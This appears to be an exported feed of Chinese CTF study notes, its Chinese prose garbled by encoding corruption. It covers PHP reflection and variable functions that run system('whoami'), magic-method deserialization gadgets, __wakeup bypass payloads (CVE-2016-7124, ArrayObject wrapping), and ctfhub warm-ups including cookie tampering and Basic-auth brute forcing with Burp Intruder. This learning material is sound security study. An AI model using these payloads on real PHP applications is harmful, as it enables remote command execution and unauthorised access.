<h2 id="Reflection"><a href="#Reflection" class="headerlink" title="Reflection"></a>Reflection</h2><h3 id="ReflectionMethod"><a href="#ReflectionMethod" class="headerlink" title="ReflectionMethod"></a>ReflectionMethod</h3><p>è¯¥ç±»ä¸­æœ‰ä¸ª<code>getDocComment()</code> æ–¹æ³•ï¼Œå¯ä»¥è·å¾—ç±»ä¸­å‡½æ•°çš„æ³¨é‡Šå†…å®¹ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include(&#x27;flag.php&#x27;);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$a = new ReflectionMethod(&#x27;F&#x27;,&#x27;get&#x27;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>è¾“å‡º</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304182029027.png" alt="image-20230418202913993"></p>
<h3 id="ReflectionClass"><a href="#ReflectionClass" class="headerlink" title="ReflectionClass"></a>ReflectionClass</h3><p>èƒ½æ˜¾ç¤ºå‡ºç±»ä¸­çš„å±æ€§å’Œæ–¹æ³•ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">class F&#123;</span><br><span class="line">    protected $pro;</span><br><span class="line">    private $pri;</span><br><span class="line">    protected function get()&#123;</span><br><span class="line">        echo &#x27;pro&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$ref = new ReflectionClass(&#x27;F&#x27;);</span><br><span class="line">echo $ref;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304182032267.png" alt="image-20230418203240233"></p>
<h3 id="ReflectionFunction"><a href="#ReflectionFunction" class="headerlink" title="ReflectionFunction"></a>ReflectionFunction</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = &quot;system&quot;;</span><br><span class="line">$b = &quot;whoami&quot;;</span><br><span class="line">$func = new ReflectionFunction($a);</span><br><span class="line">echo $func-&gt;invokeArgs(array($b));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304182152509.png" alt="image-20230418215234029"></p>
<h1 id="åŠ¨æ€è°ƒç”¨"><a href="#åŠ¨æ€è°ƒç”¨" class="headerlink" title="åŠ¨æ€è°ƒç”¨"></a>åŠ¨æ€è°ƒç”¨</h1><p>å­¦ä¹ ä¸­çœ‹åˆ°åˆ«äººçš„åšå®¢ç»å¸¸æåˆ°â€œåŠ¨æ€è°ƒç”¨â€ï¼Œå› æ­¤å»äº†è§£äº†ä¸€ä¸‹ã€‚</p>
<p>PHP æ”¯æŒå¯å˜å‡½æ•°çš„æ¦‚å¿µã€‚è¿™æ„å‘³ç€å¦‚æœä¸€ä¸ªå˜é‡ååæœ‰åœ†æ‹¬å·ï¼ŒPHP å°†å¯»æ‰¾ä¸å˜é‡çš„å€¼åŒåçš„å‡½æ•°ï¼Œå¹¶ä¸”å°è¯•æ‰§è¡Œå®ƒã€‚å¯å˜å‡½æ•°å¯ä»¥ç”¨æ¥å®ç°åŒ…æ‹¬å›è°ƒå‡½æ•°ï¼Œå‡½æ•°è¡¨åœ¨å†…çš„ä¸€äº›ç”¨é€”ã€‚</p>
<p>å½“ç»™ä¸€ä¸ªå‡½æ•°åèµ‹å€¼ç»™ä¸€ä¸ªå˜é‡æ—¶ï¼Œå¯ä»¥é€šè¿‡è°ƒç”¨è¿™ä¸ªå˜é‡æ¥è°ƒç”¨è¿™ä¸ªå‡½æ•°ã€‚</p>
<p>æµ…æ˜¾ä¸€ç‚¹çš„æœ‰ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = &quot;system&quot;;</span><br><span class="line">$b = &quot;whoami&quot;;</span><br><span class="line">($a)($b);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>è¿™æ ·ç›¸å½“äºç›´æ¥æ‰§è¡Œäº†<code>system(whoami)</code>å‘½ä»¤ã€‚</p>
<p>å¤æ‚è°ƒç”¨æœ‰ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class F&#123;</span><br><span class="line">	public function sys($exec)&#123;</span><br><span class="line">		system($exec);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$n = new F();</span><br><span class="line">$a = array($n,&quot;sys&quot;);</span><br><span class="line">$b = &quot;whoami&quot;;</span><br><span class="line">$a($b);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>å…¶ä¸­é€šè¿‡æ•°ç»„æ¥è°ƒç”¨Fç±»ä¸­çš„syså‡½æ•°ï¼Œå¹¶æŠŠ<code>whoami</code>èµ‹å€¼ç»™$bï¼Œä¼ åˆ°äº†Fç±»ä¸­çš„syså‡½æ•°ã€‚</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304182208435.png" alt="image-20230418220831410"></p>
<h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p><a href="https://johnfrod.top/%E5%AE%89%E5%85%A8/ctf-%E4%B8%AD-php%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9A%84%E5%88%A9%E7%94%A8/">CTF ä¸­ PHPåŸç”Ÿç±»çš„åˆ©ç”¨ â€“ JohnFrodâ€™s Blog</a></p>
<p><a href="https://xz.aliyun.com/t/3357">ä¸€ç¯‡æ–‡ç« å¸¦ä½ æ·±å…¥ç†è§£æ¼æ´ä¹‹ XXE æ¼æ´ - å…ˆçŸ¥ç¤¾åŒº (aliyun.com)</a></p>
<p><a href="https://www.php.net/manual/zh/functions.variable-functions.php">PHP: å¯å˜å‡½æ•° - Manual</a></p>
]]></content>
      <categories>
        <category>å­¦ä¹ ç¬”è®°</category>
      </categories>
      <tags>
        <tag>åŸºç¡€</tag>
      </tags>
  </entry>
  <entry>
    <title>phpé­”æœ¯æ–¹æ³•</title>
    <url>/2023/04/16/PHP%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<h2 id="å…³äºphpçš„ååºåˆ—åŒ–"><a href="#å…³äºphpçš„ååºåˆ—åŒ–" class="headerlink" title="å…³äºphpçš„ååºåˆ—åŒ–"></a>å…³äºphpçš„ååºåˆ—åŒ–</h2><p>é¢˜é‡Œä¸»è¦å°±æ˜¯å„ç§åˆ©ç”¨é­”æœ¯æ–¹æ³•è¿›è¡Œè·³è½¬ï¼Œä»è€Œå®ç°æ¶æ„ä»£ç ã€‚</p>
<p>è¦åˆ©ç”¨è¿™äº›é­”æœ¯æ–¹æ³•ï¼Œå°±ä¸å¾—ä¸äº†è§£ä¸€ä¸‹æœ‰ä»€ä¹ˆå’Œå¦‚ä½•åˆ©ç”¨</p>
<h2 id="é­”æœ¯æ–¹æ³•"><a href="#é­”æœ¯æ–¹æ³•" class="headerlink" title="é­”æœ¯æ–¹æ³•"></a>é­”æœ¯æ–¹æ³•</h2><h3 id="construct"><a href="#construct" class="headerlink" title="__construct()"></a>__construct()</h3><p>æ„é€ å‡½æ•°ï¼Œåªæœ‰åœ¨newä¸€ä¸ªå¯¹è±¡çš„æ—¶å€™ä¼šè§¦å‘ï¼Œè¿™æ—¶å€™ä¼šæ‰§è¡Œ__construct()ä¸‹çš„è¯­å¥</p>
<p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåœ¨åºåˆ—åŒ–å’Œååºåˆ—åŒ–ä¸­éƒ½ä¸ä¼šè§¦å‘è¯¥æ–¹æ³•</p>
<h3 id="destruct"><a href="#destruct" class="headerlink" title="__destruct()"></a>__destruct()</h3><p>ææ„å‡½æ•°ä¼šåœ¨å¯¹è±¡è¢«é”€æ¯çš„æ—¶å€™è¢«è°ƒç”¨ï¼Œå…¸å‹çš„å°±æ˜¯dieå’Œunsetå‡½æ•°ï¼Œå¯’å‡è€ƒæ ¸çš„æ—¶å€™å°±ç”¨åˆ°äº†è¿™ä¸ªç‚¹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class web</span><br><span class="line">&#123;</span><br><span class="line">    public function __wakeup() </span><br><span class="line">    &#123;</span><br><span class="line">        die(&quot;ä¸è®¸ååºåˆ—åŒ–å“¦&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class pwn</span><br><span class="line">&#123;</span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        echo $this-&gt;r1 . &#x27;  --0xfa&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å½“æ•´ä¸ªè¿‡ç¨‹è¢«dieé”€æ¯ä¹‹åï¼Œè‡ªç„¶ä¼šè§¦å‘pwnçš„__destructå‡½æ•°ï¼Œå‰ææ˜¯åºåˆ—åŒ–çš„æ—¶å€™åŒ…å«äº†pwn</p>
<p>åŒæ—¶ï¼Œååºåˆ—åŒ–ç»“æŸå›æ”¶çš„æ—¶å€™ä¹Ÿä¼šè°ƒç”¨</p>
<h3 id="call"><a href="#call" class="headerlink" title="__call()"></a>__call()</h3><p>å½“è°ƒç”¨ä¸€ä¸ª<strong>ä¸å­˜åœ¨çš„æ–¹æ³•</strong>æ—¶ä¼šè§¦å‘</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class A</span><br><span class="line">&#123;</span><br><span class="line">    public function __call($name,$arguments)</span><br><span class="line">    &#123;</span><br><span class="line">        echo $name.&#x27;--&#x27;.$arguments[0];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = new A();</span><br><span class="line">$a -&gt; fun(&#x27;test&#x27;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>è°ƒç”¨äº†ä¸€ä¸ªä¸å­˜åœ¨çš„æ–¹æ³•fun()ï¼Œå‘fun()ä¸­ä¼ å…¥äº†å‚æ•°testï¼Œæ‰€ä»¥ä¼šæŠŠè¿™ä¸ªä¸å­˜åœ¨çš„å‡½æ•°åå­˜å…¥__callé‡Œçš„$nameå˜é‡ï¼Œå‚æ•°testå­˜å…¥$argumentsä¸­ã€‚è¿™ä¸ª$argumentsæ˜¯æ•°ç»„å˜é‡ã€‚</p>
<p>å¾—åˆ°ç»“æœ</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304081527924.png" alt="image-20230408152719876"></p>
<h3 id="get"><a href="#get" class="headerlink" title="__get"></a>__get</h3><p>å½“è°ƒç”¨ä¸€ä¸ª<strong>ä¸å­˜åœ¨çš„å˜é‡</strong>æ—¶ä¼šè§¦å‘</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class A</span><br><span class="line">&#123;</span><br><span class="line">    public function __get($name)</span><br><span class="line">    &#123;</span><br><span class="line">        echo $name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = new A();</span><br><span class="line">$a -&gt; test;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>åŒæ ·çš„ï¼Œå½“è°ƒç”¨è¿™ä¸ªä¸å­˜åœ¨çš„å˜é‡testæ—¶ï¼Œä¼šè‡ªåŠ¨æ‰§è¡Œ__getå‘½ä»¤ï¼Œå¹¶æŠŠå˜é‡åä¼ å…¥$nameä¸­</p>
<h3 id="set"><a href="#set" class="headerlink" title="__set"></a>__set</h3><p>ç»™ä¸å­˜åœ¨çš„å˜é‡<strong>èµ‹å€¼</strong>çš„æ—¶å€™ä¼šè‡ªåŠ¨è§¦å‘</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class A</span><br><span class="line">&#123;</span><br><span class="line">    public function __get($nam)</span><br><span class="line">    &#123;</span><br><span class="line">        echo &#x27;get:&#x27;.$name;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __set($name,$value)</span><br><span class="line">    &#123;</span><br><span class="line">        echo &#x27;set:&#x27;.$name.$value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = new A();</span><br><span class="line">$a -&gt; test = &#x27;test&#x27;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>è¿™æ—¶å€™å°±åªä¼šè°ƒç”¨__setæ–¹æ³•ï¼Œè€Œ__getæ–¹æ³•ä¸è°ƒç”¨äº†</p>
<h3 id="isset"><a href="#isset" class="headerlink" title="__isset"></a>__isset</h3><p>å¯¹ä¸å¯è®¿é—®çš„å±æ€§è°ƒç”¨isset()æˆ–è€…empty()çš„æ—¶å€™è§¦å‘</p>
<p>ä¸å¯è®¿é—®çš„å±æ€§åŒ…æ‹¬ï¼šç§æœ‰å±æ€§ï¼Œä¸å­˜åœ¨çš„å±æ€§</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class A</span><br><span class="line">&#123;</span><br><span class="line">    protected $pro;</span><br><span class="line">    private $pri;</span><br><span class="line">    public function __isset($name)</span><br><span class="line">    &#123;</span><br><span class="line">        echo $name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$data=unserialize($_POST[&#x27;data&#x27;]);</span><br><span class="line">isset($data-&gt;pro);</span><br><span class="line">empty($data-&gt;pri);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>åœ¨hackbarä¸­ä¼ å…¥</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">data=O:1:&quot;A&quot;:2:&#123;s:6:&quot;%00*%00pro&quot;;N;s:6:&quot;%00A%00pri&quot;;N;&#125;</span><br></pre></td></tr></table></figure>

<p>åˆ™ä¼šechoå‡ºproå’Œpri</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304081607014.png" alt="image-20230408160715995"></p>
<h3 id="unset"><a href="#unset" class="headerlink" title="__unset"></a>__unset</h3><p>åŒç†ï¼Œå½“ç”¨unseté”€æ¯ä¸å¯è®¿é—®çš„æˆå‘˜å±æ€§çš„æ—¶å€™å°±ä¼šè§¦å‘è¯¥å˜é‡</p>
<h3 id="sleep"><a href="#sleep" class="headerlink" title="__sleep"></a>__sleep</h3><p>åœ¨æŠŠå¯¹è±¡serialize()çš„æ—¶å€™è§¦å‘</p>
<h3 id="wakeup"><a href="#wakeup" class="headerlink" title="__wakeup"></a>__wakeup</h3><p>åœ¨è¿›è¡Œååºåˆ—åŒ–çš„æ—¶å€™ï¼Œä¼šå…ˆæ£€æŸ¥æ˜¯å¦å­˜åœ¨__wakeupæ–¹æ³•ï¼Œå¦‚æœå­˜åœ¨åˆ™è°ƒç”¨ï¼Œå†è¿›è¡Œååºåˆ—åŒ–</p>
<p>ä¸€èˆ¬æ¥è¯´ï¼Œåœ¨åšé¢˜çš„æ—¶å€™ï¼Œwakeupä¸€èˆ¬éƒ½æ˜¯å…¥ç‚¹ï¼Œå³</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">unserialize()-&gt;A::__wakeup()</span><br></pre></td></tr></table></figure>

<p>æ­¤å¤–ï¼Œè¿˜éœ€è¦å­¦ä¼šç»•è¿‡wakeup</p>
<h4 id="CVE-2016-7124"><a href="#CVE-2016-7124" class="headerlink" title="CVE-2016-7124"></a>CVE-2016-7124</h4><p>æœ€å¸¸è§çš„ä¸€ä¸ªç»•è¿‡æ–¹æ³•ï¼Œå³ä¿®æ”¹å¯¹è±¡ä¸ªæ•°å€¼</p>
<p>æ­£å¸¸çš„å€¼å¦‚ä¸‹ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:1:&quot;A&quot;:1:&#123;s:1:&quot;a&quot;;N;&#125;</span><br></pre></td></tr></table></figure>

<p>å¦‚æœAä¸­å­˜åœ¨wakeupè¦ç»•è¿‡ï¼Œä»…éœ€æŠŠâ€Aâ€:1æ”¹ä¸ºâ€Aâ€:2å³å¯ç»•è¿‡</p>
<h4 id="Cç»•è¿‡"><a href="#Cç»•è¿‡" class="headerlink" title="Cç»•è¿‡"></a>Cç»•è¿‡</h4><p>æŠŠååºåˆ—åŒ–åçš„å¼€å¤´Oæ¢æˆCä¹Ÿå¯ç»•è¿‡wakeupï¼Œä¸è¿‡è¿™æ ·åªèƒ½æ‰§è¡Œconstruct()å‡½æ•°æˆ–è€…destruct()å‡½æ•°ï¼Œæ— æ³•æ·»åŠ ä»»ä½•å†…å®¹</p>
<p>ä½†åœ¨ctfshowæ„šäººæ¯è¿˜æœ‰ç§æ–°æ–¹æ³•å¯ä»¥ç»•è¿‡</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">class ctfshow&#123;</span><br><span class="line"></span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        die(&quot;not allowed!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">    	echo &#x27;pass&#x27;;</span><br><span class="line">        system($this-&gt;ctfshow);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$data = $_GET[&#x27;1+1&gt;2&#x27;];</span><br><span class="line"></span><br><span class="line">if(!preg_match(&quot;/^[Oa]:[\d]+/i&quot;, $data))&#123;</span><br><span class="line">    unserialize($data);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class ctfshow&#123;</span><br><span class="line"></span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        die(&quot;not allowed!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">    	echo &#x27;pass&#x27;;</span><br><span class="line">        system($this-&gt;ctfshow);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line">$a=new ctfshow();</span><br><span class="line">echo serialize($a);</span><br><span class="line">#O:7:&quot;ctfshow&quot;:0:&#123;&#125;</span><br></pre></td></tr></table></figure>

<p>å½“æŠŠOæ”¹Cä¼ C:7:â€ctfshowâ€:0:{}è¿›å»å¯æ˜¾ç¤ºpassï¼Œä½†æ˜¯ä¹Ÿå°±åªèƒ½è¿™ä¹ˆä¼ å…¥äº†ï¼Œæ”¹äº†ä¸œè¥¿å°±æ²¡ååº”</p>
<p>å¯ä»¥ç”¨ArrayObjectå¯¹æ­£å¸¸çš„ååºåˆ—åŒ–å†…å®¹åŒ…è£…ä¸€æ¬¡ï¼Œè®©æœ€åè¾“å‡ºçš„payloadä»¥Cå¼€å¤´</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class ctfshow &#123;</span><br><span class="line">    public $ctfshow;</span><br><span class="line"></span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        die(&quot;not allowed!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        echo &quot;OK&quot;;</span><br><span class="line">        system($this-&gt;ctfshow);</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$a=new ctfshow;</span><br><span class="line">$a-&gt;ctfshow=&quot;whoami&quot;;</span><br><span class="line">$arr=array(&quot;evil&quot;=&gt;$a);</span><br><span class="line">$oa=new ArrayObject($arr);</span><br><span class="line">$res=serialize($oa);</span><br><span class="line">echo $res;</span><br><span class="line">//unserialize($res)</span><br><span class="line">?&gt;</span><br><span class="line">#C:11:&quot;ArrayObject&quot;:77:&#123;x:i:0;a:1:&#123;s:4:&quot;evil&quot;;O:7:&quot;ctfshow&quot;:1:&#123;s:7:&quot;ctfshow&quot;;s:6:&quot;whoami&quot;;&#125;&#125;;m:a:0:&#123;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™å°±æˆåŠŸæ‰§è¡Œäº†</p>
<p>ä»¥ä¸Šå†…å®¹ç…§æŠ„ç‹—å­¦é•¿åšå®¢ï¼š<a href="https://fushuling.com/index.php/2023/03/11/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%ADwakeup%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/">PHPååºåˆ—åŒ–ä¸­wakeup()ç»•è¿‡æ€»ç»“ â€“ fushulingã®blog</a></p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304161443929.jpg" alt="img"></p>
<h3 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="__toString"></a>__toString</h3><p>å½“è¿™ä¸ªå¯¹è±¡è¢«å½“åšå­—ç¬¦ä¸²å¤„ç†çš„æ—¶å€™ï¼Œå°±ä¼šè§¦å‘</p>
<p>å¸¸è§çš„å½“åšå­—ç¬¦ä¸²å¤„ç†æœ‰ï¼š</p>
<p>echo()è¾“å‡ºï¼Œ.æ‹¼æ¥ï¼Œpreg_match()æ¯”è¾ƒï¼Œsubstr()æˆªå–ï¼Œstrcmp()æ¯”è¾ƒï¼Œfile_exists()åˆ¤æ–­ç­‰</p>
<h3 id="invoke"><a href="#invoke" class="headerlink" title="__invoke"></a>__invoke</h3><p>å½“å¯¹è±¡è¢«å½“æˆå‡½æ•°è°ƒç”¨æ—¶è§¦å‘</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class A</span><br><span class="line">&#123;</span><br><span class="line">    public $a;</span><br><span class="line">    public function __invoke()</span><br><span class="line">    &#123;</span><br><span class="line">        echo &#x27;invoke&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function invoke()</span><br><span class="line">    &#123;</span><br><span class="line">        ($this-&gt;a)();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = new A();</span><br><span class="line">$b = new A();</span><br><span class="line">$a -&gt; a = $b;</span><br><span class="line">$a -&gt; invoke();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>æ­¤æ—¶ï¼ŒAç±»ä¸­çš„$aæ˜¯ä¸€ä¸ªAç±»ï¼Œè€Œåœ¨involve()å‡½æ•°ä¸­æŠŠ$aå½“å‡½æ•°æ‰§è¡Œï¼Œå³æŠŠAç±»å½“æˆä¸€ä¸ªå‡½æ•°è°ƒç”¨ï¼Œè‡ªç„¶å°±è¿›å…¥äº†__invoke()ä¸­</p>
<h3 id="clone"><a href="#clone" class="headerlink" title="__clone()"></a>__clone()</h3><p>å½“cloneä¸€ä¸ªç±»æ—¶è°ƒç”¨</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class w_wuw_w</span><br><span class="line">&#123;</span><br><span class="line">    public function __invoke()&#123;</span><br><span class="line">        $this -&gt; aaa = clone new EeE;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class EeE</span><br><span class="line">&#123;</span><br><span class="line">    public function __clone()&#123;</span><br><span class="line">        $a = new cycycycy;</span><br><span class="line">        $a -&gt; aaa();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å½“è¿›å…¥w_wuw_wç±»ä¸­çš„__invoke()æ—¶ï¼Œä¼šcloneä¸€ä¸ªEeEï¼Œæ­¤æ—¶åˆ™ä¼šè¿›å…¥EeEä¸­çš„__clone()</p>
]]></content>
      <categories>
        <category>å­¦ä¹ ç¬”è®°</category>
      </categories>
      <tags>
        <tag>åŸºç¡€</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfhubç»ƒä¹ </title>
    <url>/2023/11/23/ctfhub%E7%BB%83%E4%B9%A0/</url>
    <content><![CDATA[<h1 id="Webå‰ç½®æŠ€èƒ½"><a href="#Webå‰ç½®æŠ€èƒ½" class="headerlink" title="Webå‰ç½®æŠ€èƒ½"></a>Webå‰ç½®æŠ€èƒ½</h1><h2 id="HTTPåè®®"><a href="#HTTPåè®®" class="headerlink" title="HTTPåè®®"></a>HTTPåè®®</h2><h3 id="è¯·æ±‚æ–¹å¼"><a href="#è¯·æ±‚æ–¹å¼" class="headerlink" title="è¯·æ±‚æ–¹å¼"></a>è¯·æ±‚æ–¹å¼</h3><p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152147545.png" alt="1"></p>
<p>æ³¨æ„åˆ°é¢˜ä¸­è¦æ±‚ä½¿ç”¨CTF**B Methodï¼Œæ•…åœ¨Burp-Suiteå°†GETæ–¹å¼æ”¹ä¸ºCTFHUBï¼ˆåŒºåˆ†å¤§å°å†™ï¼‰ã€‚</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152147440.png" alt="2"></p>
<p>å°†Interceptæ‰“å¼€åæ‰“å¼€æµè§ˆå™¨å¹¶å¡«å…¥URLï¼Œå°†æ©™è‰²æ ‡è¯†ä¸­çš„GETæ–¹æ³•æ”¹ä¸ºCTFHUBåå‘é€ï¼Œå¾—åˆ°å¦‚ä¸‹flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152147987.png" alt="flag"></p>
<h3 id="302è·³è½¬"><a href="#302è·³è½¬" class="headerlink" title="302è·³è½¬"></a>302è·³è½¬</h3><p>æ‰“å¼€URLå¦‚ä¸‹</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152137392.png" alt="1"></p>
<p>æ‰“å¼€Interceptå¹¶è¿›å…¥HTTP historyæŸ¥çœ‹</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152137699.png" alt="2"></p>
<p>å‘ç°ä¸¤å¤„302è·³è½¬ï¼ŒæŸ¥çœ‹å¾—åˆ°flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152137958.png" alt="flag"></p>
<h3 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h3><p>æ‰“å¼€URLå¦‚ä¸‹</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152138827.png" alt="1"></p>
<p>å¾—çŸ¥è¦ä½¿ç”¨adminç™»é™†</p>
<p>åˆ·æ–°æ‹¦æˆªä¸€ä¸‹è¯·æ±‚</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152138275.png" alt="2"></p>
<p>å°†admin&#x3D;0æ”¹ä¸ºadmin&#x3D;1å¹¶å‘é€ï¼Œå¾—åˆ°flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152138254.png" alt="flag"></p>
<h3 id="åŸºç¡€è®¤è¯"><a href="#åŸºç¡€è®¤è¯" class="headerlink" title="åŸºç¡€è®¤è¯"></a>åŸºç¡€è®¤è¯</h3><p>æ‰“å¼€URLç‚¹å‡»click</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152145795.png" alt="1"></p>
<p>åœ¨HTTP historyä¸­æŸ¥çœ‹responseï¼Œæ³¨æ„åˆ°è®¤è¯æç¤ºâ€œBasic realm&#x3D;â€Do u know admin ?â€â€</p>
<p>çŒœæµ‹ç™»é™†ç”¨æˆ·åä¸ºadmin</p>
<p>è¾“å…¥ç”¨æˆ·åå¯†ç åæŠ“åŒ…ï¼Œçœ‹åˆ°base64åŠ å¯†åçš„å­—ç¬¦</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152145934.png" alt="2"></p>
<p>åœ¨è§£ç å™¨ä¸­å‘ç°æ˜¯è´¦å·:å¯†ç çš„æ ¼å¼ï¼Œè€Œè´¦å·ä¸ºadmin</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152146262.png" alt="3"></p>
<p>ä½¿ç”¨çˆ†ç ´æ¨¡å—intruder</p>
<p>å°†è¯¥è¯·æ±‚å‘é€åˆ°intruderï¼Œå°†basicåé¢çš„å­—ç¬¦é€‰ä¸­å¹¶ç‚¹å‡»å³ä¾§AddÂ§</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152146966.png" alt="4"></p>
<p>è¿›å…¥payloadså¯¼å…¥ctfhubç»™çš„å¯†ç æœ¬</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152146548.png" alt="5"></p>
<p>åŒæ—¶æ·»åŠ å‰ç¼€admin:ï¼ˆæ³¨æ„ä¸­é—´çš„:ï¼‰</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152146884.png" alt="6"></p>
<p>æ·»åŠ base64ç¼–ç </p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152146899.png" alt="7"></p>
<p>å–æ¶ˆurlç¼–ç ï¼Œä¸ç„¶&#x3D;ä¼šè¢«è½¬åŒ–ä¸º%3d</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152146329.png" alt="8"></p>
<p>å¼€å§‹çˆ†ç ´</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152146048.png" alt="9"></p>
<p>ç­›é€‰çŠ¶æ€200å¹¶æŸ¥çœ‹è¿”å›å€¼ï¼Œå¾—åˆ°flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152146336.png" alt="flag"></p>
